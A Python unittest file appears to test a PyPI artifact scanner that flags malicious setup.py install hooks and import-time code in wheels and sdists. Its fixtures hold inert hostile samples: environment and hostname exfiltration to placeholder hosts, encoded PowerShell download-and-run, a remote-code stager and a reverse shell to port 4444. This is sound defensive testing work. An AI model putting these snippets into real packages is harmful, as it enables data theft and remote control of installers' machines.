"""Registry verdicts on the audit's PyPI blind spots (0.1.7): what pip runs to
install an sdist — setup.py and the modules it imports, now also from src/
and through relative imports — fails on encoded PowerShell, a stager string,
a reverse shell, host information sent out and a download that is run; and
the modules a package's top-level modules import (wheel or sdist) get the
import-time test, CRITICAL for the shapes no library needs.

BR-5 (0.1.9): both walks go to the end. They stopped at 300 modules seen (the
import-time walk) and 200 (setup.py's), so a module imported past them, by
padding, got no test; and each module of an import list, a statement after a
`;` or a compound statement's `:`, a continued line, a commented name list and
a module named by a literal to import_module(), __import__() or run_module()
are followed. The deadline is checked as each module is read.

Payloads are inert: hosts are .invalid, nothing is extracted or executed.
"""
import base64
import time
import unittest
from unittest import mock

from lazaret.registry import repo
from tests.registry._review_support import issues, scan_sdist, scan_wheel, zipball

WHEEL_META = {"x-1.0.dist-info/METADATA": "Name: x\nVersion: 1.0\n"}
SETUP = "from setuptools import setup\nsetup(name='x')\n"
# the whole environment sent away: CRITICAL at import time
EVIL_PY = ("import os, json, urllib.request\nurllib.request.urlopen('https://collector.invalid/c', "
           "data=json.dumps(dict(os.environ)).encode())\n")
# the host name sent away: CRITICAL in code pip runs to install an sdist
BEACON_PY = ("import socket, requests\n"
             "requests.post('https://x.invalid/b', json={'h': socket.gethostname()})\n")
PS_RUN = base64.b64encode('Invoke-WebRequest -Uri "https://x.invalid/a.exe" -OutFile "a.exe"; '
                          'Invoke-Expression "a.exe"'.encode("utf-16-le")).decode()


def hooks(res):
    return sorted((i["file"], i["sev"], i["msg"]) for i in issues(res, "SC-INSTALL-HOOK"))


def imports(res):
    return sorted((i["file"], i["sev"]) for i in issues(res, "SC-IMPORT-RISK"))


class SetupPyTests(unittest.TestCase):
    def test_encoded_powershell(self):
        res = scan_sdist({"setup.py": "import subprocess\nsubprocess.Popen('powershell -WindowStyle Hidden "
                                      f"-EncodedCommand {PS_RUN}', shell=False)\n" + SETUP})
        self.assertEqual(hooks(res), [("setup.py", "CRITICAL", "setup.py runs when pip builds or installs this sdist, "
                                       "and it runs an encoded PowerShell command that downloads and runs code.")])
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_a_download_that_is_run(self):
        res = scan_sdist({"setup.py": ("import requests, subprocess, sys\nfrom setuptools.command.install import install\n"
                                       "class I(install):\n    def run(self):\n"
                                       "        r = requests.get('https://cdn.invalid/rat.py')\n"
                                       "        with open('rat.py', 'wb') as f:\n            f.write(r.content)\n"
                                       "        subprocess.check_call([sys.executable, 'rat.py'])\n" + SETUP)})
        self.assertEqual(hooks(res), [("setup.py", "CRITICAL", "setup.py runs when pip builds or installs this sdist, "
                                       "and it downloads a script and runs it with Python.")])

    def test_a_stager_and_a_reverse_shell(self):
        stager = ('import tempfile, os, sys\nt = tempfile.NamedTemporaryFile(delete=False)\n'
                  't.write(b"""from urllib.request import urlopen as u;exec(u(\'https://x.invalid/p\').read())""")\n'
                  't.close()\nos.system(f"start {sys.executable} {t.name}")\n')
        shell = ("import socket, os, subprocess\ns = socket.socket()\ns.connect(('10.0.0.1', 4444))\n"
                 "os.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nsubprocess.call(['/bin/sh', '-i'])\n")
        for text, reason in ((stager, "carries a script that downloads and runs code"), (shell, "opens a reverse shell")):
            with self.subTest(reason):
                res = scan_sdist({"setup.py": text + SETUP})
                (hit,) = issues(res, "SC-INSTALL-HOOK")
                self.assertEqual(hit["sev"], "CRITICAL")
                self.assertIn(reason, hit["msg"])

    def test_the_package_setup_py_imports_from_src(self):
        res = scan_sdist({"setup.py": "import x\n" + SETUP, "src/x/__init__.py": "from .beacon import send\nsend()\n",
                          "src/x/beacon.py": ("import socket, requests\ndef send():\n"
                                              "    requests.post('https://x.invalid/b', json={'h': socket.gethostname()})\n")})
        self.assertEqual(hooks(res), [("src/x/beacon.py", "CRITICAL", "src/x/beacon.py runs when pip builds or installs "
                                       "this sdist, and it sends the machine's user or host name over the network.")])

    def test_an_ordinary_setup_py(self):
        res = scan_sdist({"setup.py": ("import os, subprocess\nfrom setuptools import setup\n"
                                       "version = subprocess.check_output(['git', 'describe']).decode().strip()\n"
                                       "setup(name='x', version=version)\n"), "x/__init__.py": "__version__ = '1'\n"})
        self.assertEqual((hooks(res), imports(res), res["verdict"]), ([], [], "OK"))


class ImportReachTests(unittest.TestCase):
    def test_a_wheel_module_its_package_imports(self):
        res = scan_wheel({**WHEEL_META, "x/__init__.py": "from .core import go\ngo()\n",
                          "x/core.py": ("import urllib.request\ndef go():\n"
                                        "    exec(urllib.request.urlopen('https://x.invalid/p').read())\n"),
                          "x/unused.py": ("import urllib.request\n"
                                          "exec(urllib.request.urlopen('https://x.invalid/q').read())\n")})
        self.assertEqual(imports(res), [("x/core.py", "CRITICAL")])     # unused.py: nothing imports it
        self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_absolute_and_from_imports(self):
        res = scan_wheel({**WHEEL_META, "x/__init__.py": "import x.a\nfrom x import b\nfrom x.c import thing\n",
                          "x/a.py": "A = 1\n", "x/b.py": "B = 1\n",
                          "x/c.py": ("import socket, requests\ndef thing():\n"
                                     "    requests.post('https://pipedream.net/x', data=socket.gethostname())\n")})
        self.assertEqual(imports(res), [("x/c.py", "CRITICAL")])

    def test_an_sdist_package(self):
        res = scan_sdist({"setup.py": SETUP, "x/__init__.py": "from . import telemetry\n",
                          "x/telemetry.py": ("import socket, requests\n"
                                             "requests.post('https://webhook.site/0', json={'h': socket.gethostname()})\n"),
                          "tests/test_x.py": ("import socket, requests\n"
                                              "requests.post('https://webhook.site/1', json={'h': socket.gethostname()})\n")})
        self.assertEqual(imports(res), [("x/telemetry.py", "CRITICAL")])

    def test_padding_hides_no_module(self):
        # x/__init__.py imports n modules, the last of which imports evil.py: past 299, evil.py lost its CRITICAL
        # finding (the walk stopped at 300 modules seen, before reading any of them; and a name list was read to
        # 50 names or 2,000 characters, an import list to its first module)
        for n in (5, 320):
            pads = {f"x/pad{i}.py": f"P{i} = {i}\n" for i in range(n - 1)}
            pads[f"x/pad{n - 1}.py"] = "from . import evil\n"
            names = [f"pad{i}" for i in range(n)]
            for form, init in (("lines", "".join(f"from . import {name}\n" for name in names)),
                               ("one name list", "from . import (" + ",\n    ".join(names) + ")\n"),
                               ("one import list", "import " + ", ".join(f"x.{name}" for name in names) + "\n")):
                with self.subTest(n=n, form=form):
                    res = scan_wheel({**WHEEL_META, "x/__init__.py": init, **pads, "x/evil.py": EVIL_PY})
                    self.assertEqual(imports(res), [("x/evil.py", "CRITICAL")])
                    self.assertEqual(res["verdict"], "SUSPICIOUS", res["verdictReason"])

    def test_a_deep_chain(self):
        chain = {f"x/m{i}.py": f"from . import m{i + 1}\n" for i in range(400)}
        chain["x/m400.py"] = "from .m0 import *\nfrom . import evil\n"              # (and back: each module once)
        res = scan_wheel({**WHEEL_META, "x/__init__.py": "from . import m0\n", **chain, "x/evil.py": EVIL_PY})
        self.assertEqual(imports(res), [("x/evil.py", "CRITICAL")])

    def test_the_forms_of_an_import_statement(self):
        for label, init in (
                ("an import list", "import os, x.evil\n"),
                ("after a semicolon", "import os; import x.evil\n"),
                ("in a compound statement", "try: import x.evil\nexcept ImportError: pass\n"),
                ("a continued line", "import os, \\\n    x.evil\n"),
                ("a commented name list", "from . import (  # the parts\n    other,  # (this one)\n    evil,\n)\n"),
                ("a name list with no space", "from x import(evil)\n"),
                ("dots against import", "from .import evil\n"),
                ("a package's submodule", "from .sub.inner import f\n")):
            with self.subTest(label):
                evil = "x/sub/__init__.py" if label == "a package's submodule" else "x/evil.py"
                res = scan_wheel({**WHEEL_META, "x/__init__.py": init, "x/other.py": "",
                                  "x/sub/inner.py": "def f():\n    pass\n", evil: EVIL_PY})
                self.assertEqual(imports(res), [(evil, "CRITICAL")])

    def test_a_module_named_to_import_module_import_or_run_module(self):
        for label, text in (
                ("import_module", "import importlib\nimportlib.import_module('x.evil')\n"),
                ("imported from importlib", 'from importlib import import_module\nimport_module(r"x.evil")\n'),
                ("against __package__", "import importlib\nimportlib.import_module('.evil', __package__)\n"),
                ("against __name__", "import importlib\nimportlib.import_module(\n    '.evil', package=__name__)\n"),
                ("against a literal", "import importlib\nimportlib.import_module('..evil', 'x.sub')\n"),
                ("__import__", "__import__('x.evil')\n"),
                ("run_module", "import runpy\nrunpy.run_module('x.evil')\n")):
            with self.subTest(label):
                res = scan_wheel({**WHEEL_META, "x/__init__.py": text, "x/evil.py": EVIL_PY})
                self.assertEqual(imports(res), [("x/evil.py", "CRITICAL")])
        # in a module that is not a package, __name__ names the module: '.evil' is x.a.evil, '..evil' x.evil
        for rel, want in ((".evil", []), ("..evil", [("x/evil.py", "CRITICAL")])):
            with self.subTest(name=rel):
                res = scan_wheel({**WHEEL_META, "x/__init__.py": "from . import a\n", "x/evil.py": EVIL_PY,
                                  "x/a.py": f"import importlib\nimportlib.import_module('{rel}', __name__)\n"})
                self.assertEqual(imports(res), want)
        # not followed: a name built as the code runs; a relative name with no package (import_module raises)
        for text in ("import importlib\nimportlib.import_module(f'x.{NAME}')\n",
                     "import importlib\nimportlib.import_module('.evil')\n", "__import__('.evil')\n"):
            with self.subTest(text=text):
                res = scan_wheel({**WHEEL_META, "x/__init__.py": text, "x/evil.py": EVIL_PY})
                self.assertEqual(imports(res), [])

    def test_the_walk_stops_at_the_deadline(self):
        chain = {f"x/m{i}.py": f"from . import m{i + 1}\n" for i in range(400)}
        real = repo._ArtifactScan._deadline

        def deadline(scan, where):
            if where == "x/m200.py" and not scan.first_pass:        # the time runs out as the walk reaches m200
                scan.budget = repo.Budget(deadline=0.0)
            return real(scan, where)
        data = zipball({**WHEEL_META, "x/__init__.py": "from . import m0\n", **chain})
        with mock.patch.object(repo._ArtifactScan, "_deadline", deadline):
            res = repo._scan_artifact(data, "zip", "wheel", False, repo.Budget(deadline=time.monotonic() + 60))
        self.assertEqual((res["verdict"], res["incomplete"]), ("INCOMPLETE", ["time"]))
        self.assertIn("x/m200.py", " ".join(i["msg"] for i in issues(res, "SC-TRUNCATED")))


class ImportReaderTests(unittest.TestCase):
    """repo._py_import_targets: what a module names to import, as (dotted name, base) pairs."""

    def targets(self, text, rel="x/__init__.py"):
        return repo._py_import_targets(rel, text)

    def test_a_name_lists_comments_end_nothing(self):
        # a `)` in a comment closes nothing; a statement in a comment is not read, nor does it end the list
        text = "from . import (a,  # (see below)\n    b,  # note: import c\n    d)\nimport e\n"
        self.assertEqual(self.targets(text), [("a", "x"), ("b", "x"), ("d", "x"), ("e", None)])

    def test_a_list_that_is_not_closed_ends_where_no_list_goes_on(self):
        # (in a docstring): the statement after it is read
        text = '"""\nfrom y import (a,\n"""\nimport evil\n'
        self.assertEqual(self.targets(text), [("y", None), ("y.a", None), ("evil", None)])

    def test_linear_time_on_hostile_texts(self):
        for label, text in (("lists not closed", "from x import (\n" * 100_000),
                            ("statements in a list's comments",
                             "from x import (\n" + "    a,  # :from y import (\n" * 100_000 + ")\n"),
                            ("a long name list", "from . import (" + "a, " * 200_000 + ")\n"),
                            ("semicolons", ";import a" * 200_000), ("colons", ":" * 1_000_000),
                            ("literals not closed", "import_module('aaaa" * 200_000),
                            ("a list of comments", "from x import (\n" + "# )\n" * 200_000 + "evil)\n")):
            with self.subTest(label):
                start = time.monotonic()
                self.targets(text)
                self.assertLess(time.monotonic() - start, 10)


class InstallReachTests(unittest.TestCase):
    """setup.py's imports: the modules it runs as pip installs the sdist get the install-script test."""

    def test_padding_hides_no_module(self):
        # setup.py imports 250 modules, the first of which imports hook.py: past 199, hook.py was not an install
        # script (helpers/ has no __init__.py: nothing imports it once installed)
        pads = {f"helpers/pad{i}.py": "" for i in range(1, 250)}
        pads["helpers/pad0.py"] = "from . import hook\n"
        setup = "".join(f"import helpers.pad{i}\n" for i in range(250)) + SETUP
        res = scan_sdist({"setup.py": setup, **pads, "helpers/hook.py": BEACON_PY})
        self.assertEqual(hooks(res), [("helpers/hook.py", "CRITICAL", "helpers/hook.py runs when pip builds or "
                                       "installs this sdist, and it sends the machine's user or host name over "
                                       "the network.")])

    def test_import_lists_and_named_modules(self):
        for label, setup in (("an import list", "import os, helpers.hook\n"),
                             ("a package's submodule", "from helpers import hook\n"),
                             ("import_module", "import importlib\nimportlib.import_module('helpers.hook')\n"),
                             ("in src/", "import sys\nsys.path.insert(0, 'src')\nimport os; import helpers.hook\n")):
            with self.subTest(label):
                where = "src/helpers/hook.py" if label == "in src/" else "helpers/hook.py"
                res = scan_sdist({"setup.py": setup + SETUP, where: BEACON_PY})
                self.assertEqual([(f, sev) for f, sev, _msg in hooks(res)], [(where, "CRITICAL")])

    def test_an_in_tree_backends_imports(self):
        # pip puts the backend-path directories on sys.path: an absolute import there is a module of the sdist
        pyproject = '[build-system]\nrequires = []\nbuild-backend = "backend"\nbackend-path = ["_build"]\n'
        res = scan_sdist({"pyproject.toml": pyproject, "_build/backend.py": "import helper\n",
                          "_build/helper.py": BEACON_PY})
        self.assertEqual([(f, sev) for f, sev, _msg in hooks(res)], [("_build/helper.py", "CRITICAL")])


if __name__ == "__main__":
    unittest.main()
